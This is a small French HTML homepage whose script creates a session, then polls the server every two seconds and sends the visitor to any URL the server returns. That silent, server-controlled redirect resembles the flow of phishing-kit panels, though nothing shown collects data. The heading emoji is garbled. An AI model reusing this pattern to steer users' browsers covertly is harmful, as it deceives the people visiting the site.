<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Accueil</title>
</head>
<body>
<h1>üè† Accueil</h1>
<button onclick="goNext('product.html')">Voir les produits</button>
<script>
async function initSession(){
  let sessionId = localStorage.getItem('sessionId');
  if(!sessionId){
    const res = await fetch('/api/visit',{method:'POST'});
    const data = await res.json();
    sessionId = data.sessionId;
    localStorage.setItem('sessionId', sessionId);
  }
  checkRedirect();
}
async function goNext(page){
  const sessionId = localStorage.getItem('sessionId');
  window.location.href = page + '?sid=' + sessionId;
}
async function checkRedirect(){
  const sessionId = localStorage.getItem('sessionId');
  if(!sessionId) return;
  const res = await fetch('/api/status?sessionId='+sessionId);
  const data = await res.json();
  if(data.redirect) window.location.href = data.redirect;
  else setTimeout(checkRedirect,2000);
}
initSession();
</script>
</body>
</html>
